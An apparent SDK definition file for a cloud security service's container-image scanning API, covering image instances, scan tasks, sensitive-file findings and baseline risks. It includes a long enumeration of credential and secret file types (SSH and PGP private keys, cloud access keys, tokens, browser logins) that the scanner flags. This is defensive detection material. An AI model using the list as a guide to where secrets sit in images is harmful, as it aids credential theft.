      alarmCount?: int32(name='AlarmCount', description='The number of alerts that are generated on the image.', example='0'),
      alarmStatus?: string(name='AlarmStatus', description='Indicates whether alerts are generated for the image. Valid values:

*   **YES**
*   **NO**', example='NO'),
      deployed?: int32(name='Deployed', description='Indicates whether the image was deployed. Valid values:

*   **0**: The image was not deployed.
*   **1**: The image was deployed.', example='1'),
      digest?: string(name='Digest', description='The digest value of the image.', example='a5ccdd9b166b67e02954aa9b618fe19b7968bd56a15463d2ad7f2643ba5b****'),
      endpoints?: string(name='Endpoints', description='The address of the image.', example='[]'),
      hcCount?: int32(name='HcCount', description='The number of baseline risks.', example='0'),
      hcStatus?: string(name='HcStatus', description='Indicates whether the image baseline risks exist. Valid values:

*   **NO**
*   **YES**', example='NO'),
      imageCreate?: string(name='ImageCreate', description='The timestamp when the image was created. Unit: milliseconds.', example='1600069948849'),
      imageId?: string(name='ImageId', description='The ID of the image.', example='c20987f18b130f9d144c9828df630417e2a9523148930dc3963e9d0dab30****'),
      imageSize?: string(name='ImageSize', description='The size of the image. Unit: MB.', example='1604487690'),
      imageUpdate?: string(name='ImageUpdate', description='The timestamp when the image was updated. Unit: milliseconds.', example='1600069948849'),
      instanceId?: string(name='InstanceId', description='The ID of the image instance.', example='39010****'),
      regionId?: string(name='RegionId', description='The region ID of the image.', example='cn-hangzhou'),
      registryType?: string(name='RegistryType', description='The type of the image. Valid values:

*   **acr**
*   **harbor**
*   **quay**
*   **CI/CD**', example='acr'),
      repoId?: string(name='RepoId', description='The ID of the image repository.', example='f2b86d20bf0855af6aa268ce90fd****'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='sas-script-test'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='N/A'),
      repoType?: string(name='RepoType', description='The type of the repository. Valid values:

*   **private**
*   **public**', example='private'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether risks exist. Valid values:

*   **NO**: No risks exist.
*   **YES**: Risks exist.', example='NO'),
      scaProgress?: int32(name='ScaProgress', description='The scan progress of the image. Valid values: 0 to 100.', example='100'),
      scaResult?: string(name='ScaResult', description='The error code of the image scan result. Valid values:

*   **TASK_NOT_EXISTS**: The image scan task does not exist.
*   **TASK_NOT_SUPPORT_REGION**: The image scan task cannot be performed in the current region.
*   **forbid_create_repeat_task**: The image scan task already exists.', example='TASK_NOT_SUPPORT_REGION'),
      scaStatus?: string(name='ScaStatus', description='The scan status of the image. Valid values:

*   **INIT**: The image scan task is to be started.
*   **START**: The image scan task is started.
*   **MESSAGE_SEND**: The message about the image scan task is sent.
*   **START_RUN**: The image scan task is started.
*   **DOWNLOAD**: The image scan result is downloaded.
*   **PRE_ANALYZER**: The image scan task is being processed.
*   **WEB_SHELL_ANALYZER**: The WebShell analysis is complete.
*   **CVE_ANALYZER**: The CVE analysis is complete.
*   **BIN_ANALYZER**: The binary analysis of the image is complete.
*   **OTHER_ANALYZER**: The extended analysis of the image is complete.
*   **SUCCESS**: The image scan task is complete.
*   **PRE_ANALYZER_SUCCESS**: The image scan task is processed.
*   **FAIL**: The image scan task fails.
*   **TIMEOUT**: The image scan task times out.', example='SUCCESS'),
      status?: string(name='Status', description='The status of the image. Valid values:

*   **NORMAL**: The image is normal.', example='NORMAL'),
      tag?: string(name='Tag', description='The tag of the image.', example='mysql_5.7'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='12f80307-60aa-4efa-863a-56d72fb****'),
      vulCount?: int32(name='VulCount', description='The number of vulnerabilities in the image.', example='0'),
      vulStatus?: string(name='VulStatus', description='Indicates whether vulnerabilities exist in the image. Valid values:

*   **YES**
*   **NO**', example='NO'),
    }
  ](name='ImageInstanceList', description='An array that consists of the information about the image.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of images returned on the current page.', example='4'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of returned entries.', example='69'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
}

model DescribeImageInstancesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageInstancesResponseBody(name='body'),
}

async function describeImageInstancesWithOptions(request: DescribeImageInstancesRequest, runtime: Util.RuntimeOptions): DescribeImageInstancesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.scanned)) {
    query['Scanned'] = request.scanned;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageInstances',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageInstances(request: DescribeImageInstancesRequest): DescribeImageInstancesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageInstancesWithOptions(request, runtime);
}

model DescribeImageLatestScanTaskRequest {
  digest?: string(name='Digest', example='8f0fbdb41d3d1ade4ffdf21558443f4c03342010563bb8c43ccc09594d50****'),
}

model DescribeImageLatestScanTaskResponseBody = {
  requestId?: string(name='RequestId', example='0B48AB3C-84FC-424D-A01D-B9270EF4****'),
  task?: [ 
    {
      create?: string(name='Create', example='2022-12-20 11:59:05'),
      finish?: int32(name='Finish', example='100'),
      finishTime?: long(name='FinishTime', example='1669693430977'),
      id?: long(name='Id', example='9755662'),
      modified?: string(name='Modified', example='2022-12-20 12:00:05'),
      name?: string(name='Name', example='IMAGE_SCAN'),
      source?: string(name='Source', example='console_batch'),
      startTime?: long(name='StartTime', example='1668614400000'),
      status?: string(name='Status', example='SUCCESS'),
      target?: string(name='Target', example='8f0fbdb41d3d1ade4ffdf21558443f4c03342010563bb8c43ccc09594d50****'),
      targetType?: string(name='TargetType', example='IMAGE'),
      taskId?: string(name='TaskId', example='0a960b9a48b788a8689154b032bf****'),
      taskType?: string(name='TaskType', example='IMAGE_SCAN'),
    }
  ](name='Task'),
}

model DescribeImageLatestScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageLatestScanTaskResponseBody(name='body'),
}

async function describeImageLatestScanTaskWithOptions(request: DescribeImageLatestScanTaskRequest, runtime: Util.RuntimeOptions): DescribeImageLatestScanTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.digest)) {
    query['Digest'] = request.digest;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageLatestScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageLatestScanTask(request: DescribeImageLatestScanTaskRequest): DescribeImageLatestScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageLatestScanTaskWithOptions(request, runtime);
}

model DescribeImageListBySensitiveFileRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page 1. Default value: 1.', example='1'),
  imageDigest?: string(name='ImageDigest', description='The image digest.
> Fuzzy match is supported.', example='v005'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20'),
  repoInstanceId?: string(name='RepoInstanceId', description='The ID of the container image.

> You can call the [ListRepository](~~ListRepository~~) operation to query the IDs of container images from the value of the InstanceId response parameter.', example='i-qewqrqcsadf****'),
  repoName?: string(name='RepoName', description='The name of the image repository.

> Fuzzy match is supported.', example='harbor-image-v001'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.
> Fuzzy match is supported.', example='libssh2'),
  riskLevel?: string(name='RiskLevel', description='The risk level of the file. Separate multiple levels with commas (,). Valid values:

- **high**
- **medium**
- **low**', example='high'),
  scanRange?: [ string ](name='ScanRange', description='An array consisting of the types of the assets that you want to scan. Valid values:
- **image**
- **container**'),
  sensitiveFileKey?: string(name='SensitiveFileKey', description='The alert type of the sensitive file. Valid values:

*   **npm_token**: NPM Token
*   **ftp_cfg**: FTP Config
*   **google\\_oauth_key**: Google OAuth Key
*   **planetscale_passwd**: Planetscale password
*   **github\\_ssh_key**: Github SSH Key
*   **msbuild\\_publish_profile**: MSBuild publish profile
*   **fastly\\_cdn_token**: Fastly CDN Token
*   **ssh\\_private_key**: SSH Private Key
*   **aws_cli**: AWS CLI Credentials
*   **cpanel\\_proftpd**: cPanel ProFTPd Credential
*   **postgresql_passwd**: PostgreSQl Passwd
*   **discord\\_client_cred**: Discord Client Credential
*   **rails_database**: Rails Database Config
*   **aws\\_access_key**: AWS Access Key
*   **esmtp_cfg**: ESMTP Config
*   **docker\\_registry_cfg**: Docker Registry Config
*   **pem**: PEM
*   **common_cred**: Common Credential
*   **sftp_cfg**: SFTP Config
*   **grafana_token**: Grafana Token
*   **slack_token**: Slack Token
*   **ec\\_private_key**: EC Private Key
*   **pypi_token**: PyPI Token
*   **finicity_token**: Finicity Token
*   **k8s\\_client_key**: Kubernetes Client Key
*   **git_cfg**: Git Config
*   **django_key**: Django Key
*   **jenkins_ssh**: Jenkins SSH Config
*   **openssh\\_private_key**: OPENSSH Private Key
*   **square_oauth**: Square OAuth Token
*   **typeform_token**: Typeform Token
*   **common\\_database_cfg**: Common Database Config
*   **wordpress\\_database_cfg**: Wordpress Database Config
*   **googlecloud\\_api_key**: Google Cloud API Key
*   **vscode_sftp**: VSCode SFTP Config
*   **apache_htpasswd**: Apache htpasswd
*   **planetscale_token**: Planetscale Token
*   **contentful\\_preview_token**: Contentful Preview Token
*   **php\\_database_cfg**: PHP Database Config
*   **atom\\_remote_sync**: Atom Remote Sync Config
*   **aws\\_session_token**: AWS Session Token
*   **atom\\_sftp_cfg**: Atom SFTP Config
*   **asana\\_client\\_private_key**: Asana Client Private Key
*   **tencentcloud_ak**: Tencent Cloud SecretId
*   **rsa\\_private_key**: RSA Private Key
*   **github\\_personal_token**: Github Personal Token
*   **pgp**: PGP
*   **stripe_skpk**: Stripe Secret Key
*   **square_token**: Square Token
*   **rails_carrierwave**: Rails Carrierwave Credential
*   **dbeaver\\_database_cfg**: DBeaver Database Config
*   **robomongo_cred**: Robomongo Credential
*   **github\\_oauth_token**: Github OAuth Token
*   **pulumi_token**: Pulumi Token
*   **ventrilo_voip**: Ventrilo VoIP Server Config
*   **macos_keychain**: macOS Keychain
*   **amazon\\_mws_token**: Amazon MWS Token
*   **dynatrace_token**: Dynatrace Token
*   **java_keystore**: Java Keystore
*   **microsoft_sdf**: Microsoft SDF
*   **kubernetes\\_dashboard_cred**: Kubernetes Dashboard User Credential
*   **atlassian_token**: Atlassian Token
*   **rdp**: RDP
*   **mailgun_key**: Mailgun Webhook Signing Key
*   **mailchimp\\_api_key**: Mailchimp API Key
*   **netrc_cfg**: .netrc config
*   **openvpn_cfg**: OpenVPN Config
*   **github\\_refresh_token**: Github Refresh Token
*   **salesforce**: Salesforce Credential
*   **sendinblue**: Sendinblue Token
*   **pkcs\\_private_key**: PKCS Private Key
*   **rubyonrails_passwd**: Ruby on Rails Passwd
*   **filezilla_ftp**: FileZilla FTP Config
*   **databricks_token**: Databricks Token
*   **gitLab\\_personal_token**: GitLab Personal Token
*   **rails\\_master_key**: Rails Master Key
*   **sqlite**: SQLite3/SQLite Database
*   **firefox_logins**: Firefox Login Config
*   **mailgun\\_private_token**: Mailgun Private Token
*   **joomla_cfg**: Joomla Config
*   **hashicorp\\_terraform_token**: Hashicorp Terraform Token
*   **jetbrains_ides**: Jetbrains IDEs Config
*   **heroku\\_api_key**: Heroku API key
*   **messagebird_token**: MessageBird Token
*   **github\\_app_token**: Github App Token
*   **hashicorp\\_vault_token**: Hashicorp Vault Token
*   **pgp\\_private_key**: PGP Private Key
*   **sshpasswd**: SSH password
*   **huaweicloud_ak**: Huaei Cloud Access Key
*   **aws_s3cmd**: AWS S3cmd Config
*   **php_config**: php Config
*   **common\\_private_key**: Common Private Key Type
*   **microsoft_mdf**: Microsoft MDF
*   **mediawiki_cfg**: MediaWiki Config
*   **jenkins_cred**: Jenkins Credential
*   **rubygems_cred**: Rubygems Credential
*   **clojars_token**: Clojars Token
*   **phoenix\\_web_passwd**: Phoenix Web Credential
*   **puttygen\\_private_key**: PuTTYgen Private Key
*   **google\\_oauth_token**: Google Oauth Token
*   **rubyonrails_cfg**: Ruby On Rails Database Config
*   **lob\\_api_key**: Lob API Key
*   **pkcs_cred**: PKCS#12
*   **otr\\_private_key**: OTR Private Key
*   **contentful\\_delivery_token**: Contentful Delivery Token
*   **digital\\_ocean_tugboat**: Digital Ocean Tugboat Config
*   **dsa\\_private_key**: DSA Private Key
*   **rails\\_app_token**: Rails App Token
*   **git_cred**: Git User Credential
*   **newrelic\\_api_key**: New Relic User API Key
*   **github_hub**: Github Token
*   **rubygem**: Rubygem Token', example='sshpasswd'),
}

model DescribeImageListBySensitiveFileShrinkRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page 1. Default value: 1.', example='1'),
  imageDigest?: string(name='ImageDigest', description='The image digest.
> Fuzzy match is supported.', example='v005'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20'),
  repoInstanceId?: string(name='RepoInstanceId', description='The ID of the container image.

> You can call the [ListRepository](~~ListRepository~~) operation to query the IDs of container images from the value of the InstanceId response parameter.', example='i-qewqrqcsadf****'),
  repoName?: string(name='RepoName', description='The name of the image repository.

> Fuzzy match is supported.', example='harbor-image-v001'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.
> Fuzzy match is supported.', example='libssh2'),
  riskLevel?: string(name='RiskLevel', description='The risk level of the file. Separate multiple levels with commas (,). Valid values:

- **high**
- **medium**
- **low**', example='high'),
  scanRangeShrink?: string(name='ScanRange', description='An array consisting of the types of the assets that you want to scan. Valid values:
- **image**
- **container**'),
  sensitiveFileKey?: string(name='SensitiveFileKey', description='The alert type of the sensitive file. Valid values:

*   **npm_token**: NPM Token
*   **ftp_cfg**: FTP Config
*   **google\\_oauth_key**: Google OAuth Key
*   **planetscale_passwd**: Planetscale password
*   **github\\_ssh_key**: Github SSH Key
*   **msbuild\\_publish_profile**: MSBuild publish profile
*   **fastly\\_cdn_token**: Fastly CDN Token
*   **ssh\\_private_key**: SSH Private Key
*   **aws_cli**: AWS CLI Credentials
*   **cpanel\\_proftpd**: cPanel ProFTPd Credential
*   **postgresql_passwd**: PostgreSQl Passwd
*   **discord\\_client_cred**: Discord Client Credential
*   **rails_database**: Rails Database Config
*   **aws\\_access_key**: AWS Access Key
*   **esmtp_cfg**: ESMTP Config
*   **docker\\_registry_cfg**: Docker Registry Config
*   **pem**: PEM
*   **common_cred**: Common Credential
*   **sftp_cfg**: SFTP Config
*   **grafana_token**: Grafana Token
*   **slack_token**: Slack Token
*   **ec\\_private_key**: EC Private Key
*   **pypi_token**: PyPI Token
*   **finicity_token**: Finicity Token
*   **k8s\\_client_key**: Kubernetes Client Key
*   **git_cfg**: Git Config
*   **django_key**: Django Key
*   **jenkins_ssh**: Jenkins SSH Config
*   **openssh\\_private_key**: OPENSSH Private Key
*   **square_oauth**: Square OAuth Token
*   **typeform_token**: Typeform Token
*   **common\\_database_cfg**: Common Database Config
*   **wordpress\\_database_cfg**: Wordpress Database Config
*   **googlecloud\\_api_key**: Google Cloud API Key
*   **vscode_sftp**: VSCode SFTP Config
*   **apache_htpasswd**: Apache htpasswd
*   **planetscale_token**: Planetscale Token
*   **contentful\\_preview_token**: Contentful Preview Token
*   **php\\_database_cfg**: PHP Database Config
*   **atom\\_remote_sync**: Atom Remote Sync Config
*   **aws\\_session_token**: AWS Session Token
*   **atom\\_sftp_cfg**: Atom SFTP Config
*   **asana\\_client\\_private_key**: Asana Client Private Key
*   **tencentcloud_ak**: Tencent Cloud SecretId
*   **rsa\\_private_key**: RSA Private Key
*   **github\\_personal_token**: Github Personal Token
*   **pgp**: PGP
*   **stripe_skpk**: Stripe Secret Key
*   **square_token**: Square Token
*   **rails_carrierwave**: Rails Carrierwave Credential
*   **dbeaver\\_database_cfg**: DBeaver Database Config
*   **robomongo_cred**: Robomongo Credential
*   **github\\_oauth_token**: Github OAuth Token
*   **pulumi_token**: Pulumi Token
*   **ventrilo_voip**: Ventrilo VoIP Server Config
*   **macos_keychain**: macOS Keychain
*   **amazon\\_mws_token**: Amazon MWS Token
*   **dynatrace_token**: Dynatrace Token
*   **java_keystore**: Java Keystore
*   **microsoft_sdf**: Microsoft SDF
*   **kubernetes\\_dashboard_cred**: Kubernetes Dashboard User Credential
*   **atlassian_token**: Atlassian Token
*   **rdp**: RDP
*   **mailgun_key**: Mailgun Webhook Signing Key
*   **mailchimp\\_api_key**: Mailchimp API Key
*   **netrc_cfg**: .netrc config
*   **openvpn_cfg**: OpenVPN Config
*   **github\\_refresh_token**: Github Refresh Token
*   **salesforce**: Salesforce Credential
*   **sendinblue**: Sendinblue Token
*   **pkcs\\_private_key**: PKCS Private Key
*   **rubyonrails_passwd**: Ruby on Rails Passwd
*   **filezilla_ftp**: FileZilla FTP Config
*   **databricks_token**: Databricks Token
*   **gitLab\\_personal_token**: GitLab Personal Token
*   **rails\\_master_key**: Rails Master Key
*   **sqlite**: SQLite3/SQLite Database
*   **firefox_logins**: Firefox Login Config
*   **mailgun\\_private_token**: Mailgun Private Token
*   **joomla_cfg**: Joomla Config
*   **hashicorp\\_terraform_token**: Hashicorp Terraform Token
*   **jetbrains_ides**: Jetbrains IDEs Config
*   **heroku\\_api_key**: Heroku API key
*   **messagebird_token**: MessageBird Token
*   **github\\_app_token**: Github App Token
*   **hashicorp\\_vault_token**: Hashicorp Vault Token
*   **pgp\\_private_key**: PGP Private Key
*   **sshpasswd**: SSH password
*   **huaweicloud_ak**: Huaei Cloud Access Key
*   **aws_s3cmd**: AWS S3cmd Config
*   **php_config**: php Config
*   **common\\_private_key**: Common Private Key Type
*   **microsoft_mdf**: Microsoft MDF
*   **mediawiki_cfg**: MediaWiki Config
*   **jenkins_cred**: Jenkins Credential
*   **rubygems_cred**: Rubygems Credential
*   **clojars_token**: Clojars Token
*   **phoenix\\_web_passwd**: Phoenix Web Credential
*   **puttygen\\_private_key**: PuTTYgen Private Key
*   **google\\_oauth_token**: Google Oauth Token
*   **rubyonrails_cfg**: Ruby On Rails Database Config
*   **lob\\_api_key**: Lob API Key
*   **pkcs_cred**: PKCS#12
*   **otr\\_private_key**: OTR Private Key
*   **contentful\\_delivery_token**: Contentful Delivery Token
*   **digital\\_ocean_tugboat**: Digital Ocean Tugboat Config
*   **dsa\\_private_key**: DSA Private Key
*   **rails\\_app_token**: Rails App Token
*   **git_cred**: Git User Credential
*   **newrelic\\_api_key**: New Relic User API Key
*   **github_hub**: Github Token
*   **rubygem**: Rubygem Token', example='sshpasswd'),
}

model DescribeImageListBySensitiveFileResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  imageInfos?: [ 
    {
      digest?: string(name='Digest', description='The image digest.', example='v005'),
      firstScanTime?: long(name='FirstScanTime', description='The UNIX timestamp of when the first scan was performed. Unit: milliseconds.', example='1649814050000'),
      instanceId?: string(name='InstanceId', description='The ID of the image instance.', example='cri-a595qp31knh9****'),
      lastScanTime?: long(name='LastScanTime', description='The UNIX timestamp of when the last scan was performed. Unit: milliseconds.', example='1649814050000'),
      regionId?: string(name='RegionId', description='The region ID of the image instance.', example='cn-hangzhou'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='opa-test'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='libssh2'),
      riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:
- **high**
- **medium**
- **low**', example='low'),
      tag?: string(name='Tag', description='The tag that is added to the image.', example='nuxeo6'),
      uuid?: string(name='Uuid', description='The UUID of the image.', example='f58681174f944623345379e23b7b****'),
    }
  ](name='ImageInfos', description='An array that consists of the information about the images.'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='4'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    lastRowKey?: string(name='LastRowKey', description='The key of the last data entry.', example='CAESGgoSChAKDGNvbXBsZXRlVGltZRABCgQiAggAGAAiQAoJAGYXFWIAAAAACjMDLgAAADFTNzMyZDMwMzAzMDM1Mzc3Njc4MzA2ODY5NmI2YTY1Nzg2NTcxNjE2NDc4NjE='),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: 20.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='83'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='E0C5C07F-1576-509A-AE44-1C36B8445B37'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:
- **true**: The request was successful.
- **false**: The request failed.', example='true'),
}

model DescribeImageListBySensitiveFileResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageListBySensitiveFileResponseBody(name='body'),
}

async function describeImageListBySensitiveFileWithOptions(tmpReq: DescribeImageListBySensitiveFileRequest, runtime: Util.RuntimeOptions): DescribeImageListBySensitiveFileResponse {
  Util.validateModel(tmpReq);
  var request = new DescribeImageListBySensitiveFileShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.scanRange)) {
    request.scanRangeShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.scanRange, 'ScanRange', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageDigest)) {
    query['ImageDigest'] = request.imageDigest;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.riskLevel)) {
    query['RiskLevel'] = request.riskLevel;
  }
  if (!Util.isUnset(request.scanRangeShrink)) {
    query['ScanRange'] = request.scanRangeShrink;
  }
  if (!Util.isUnset(request.sensitiveFileKey)) {
    query['SensitiveFileKey'] = request.sensitiveFileKey;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageListBySensitiveFile',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageListBySensitiveFile(request: DescribeImageListBySensitiveFileRequest): DescribeImageListBySensitiveFileResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageListBySensitiveFileWithOptions(request, runtime);
}

model DescribeImageListWithBaselineNameRequest {
  baselineNameKey?: string(name='BaselineNameKey', description='The name of the image baseline.', example='ak_leak'),
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='cc20a1024011c44b6a8710d6f8b****'),
  clusterName?: string(name='ClusterName', description='The name of the cluster.', example='docker-law'),
  containerId?: string(name='ContainerId', description='The ID of the container.', example='c08d5fc1a329a4b88950a253d082f****'),
  criteria?: string(name='Criteria', description='The search condition for the image baseline.', example='Unauthorized access'),
  criteriaType?: string(name='CriteriaType', description='The type of the search condition. Valid values:

*   **BaselineNameAlias**: baseline name
*   **BaselineClassAlias**: baseline category', example='BaselineNameAlias'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  image?: string(name='Image', description='The name of the image to which the container belongs.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-****'),
  imageDigest?: string(name='ImageDigest', description='The SHA-256 value of the image digest.', example='2e6daffce524ffeae66cccaa90c8fc47de912346dcec295c27395b6d66db6423'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  namespace?: string(name='Namespace', description='The namespace.', example='test-002'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10'),
  pod?: string(name='Pod', description='The pod.', example='22222-7xsqq'),
  repoInstanceId?: string(name='RepoInstanceId', description='The instance ID of the image repository.', example='i-qewqrqcsadf****'),
  repoName?: string(name='RepoName', description='The name of the image repository.', example='libssh2'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='libssh2'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that you want to scan.'),
}

model DescribeImageListWithBaselineNameResponseBody = {
  imageInfos?: [ 
    {
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c08d5fc1a329a4b88950a253d082f1****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='docker-law'),
      containerId?: string(name='ContainerId', description='The ID of the container.', example='04d20e98c8e2c93b7b864372084320a15a58c8671e53c972ce3a71d9c163****'),
      digest?: string(name='Digest', description='The SHA-256 value of the image digest.', example='2e6daffce524ffeae66cccaa90c8fc47de912346dcec295c27395b6d66db6423'),
      highRiskImage?: int32(name='HighRiskImage', description='The number of images on which **high** baseline risks are detected.', example='1'),
      image?: string(name='Image', description='The name of the image.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-conta****'),
      imageCreate?: long(name='ImageCreate', description='The timestamp when the image was created. Unit: milliseconds.', example='1636962328000'),
      imageId?: string(name='ImageId', description='The ID of the image.', example='cddb5fd33b34a1fabb358d0a19497cdfe362fe624821cb250947af0ea5cc****'),
      imageSize?: int32(name='ImageSize', description='The size of the image.', example='157408623'),
      imageUpdate?: long(name='ImageUpdate', description='The timestamp when the image was updated. Unit: milliseconds.', example='1636974116000'),
      instanceId?: string(name='InstanceId', description='The ID of the image instance.', example='cri-a595qp31knh9****'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      lastScanTime?: long(name='LastScanTime'),
      lowRiskImage?: int32(name='LowRiskImage', description='The number of images on which **low** baseline risks are detected.', example='0'),
      middleRiskImage?: int32(name='MiddleRiskImage', description='The number of images on which **medium** baseline risks are detected.', example='0'),
      namespace?: string(name='Namespace', description='The namespace.', example='test-002'),
      noRiskImage?: int32(name='NoRiskImage', description='The number of images that do not have baseline risks.', example='0'),
      pod?: string(name='Pod', description='The pod.', example='22222-7xsqq'),
      regionId?: string(name='RegionId', description='The region ID of the image instance.', example='cn-beijing'),
      repoId?: string(name='RepoId', description='The ID of the image repository.', example='crr-1lt6q7167yh6****'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='scanner'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='libssh2'),
      repoType?: string(name='RepoType', description='The type of the image repository.', example='PRIVATE'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether the image is at risk. Valid values:

*   **YES**
*   **NO**', example='YES'),
      tag?: string(name='Tag', description='The version of the image.', example='v1'),
      targetId?: string(name='TargetId'),
      targetName?: string(name='TargetName'),
      targetType?: string(name='TargetType'),
      totalItemCount?: int32(name='TotalItemCount', description='The total number of risk items that are detected on the image by using the baseline.', example='3'),
      uuid?: string(name='Uuid', description='The UUID of the image.', example='f58681174f944623345379e23b7b****'),
    }
  ](name='ImageInfos', description='An array that consists of the images returned.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of the images returned on the current page.', example='1'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page. Default value: **1**.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of images on which baseline risks are detected.', example='1'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5B8C2156-2DB9-5A42-99E7-F2ED5AE9EA1F'),
}

model DescribeImageListWithBaselineNameResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageListWithBaselineNameResponseBody(name='body'),
}

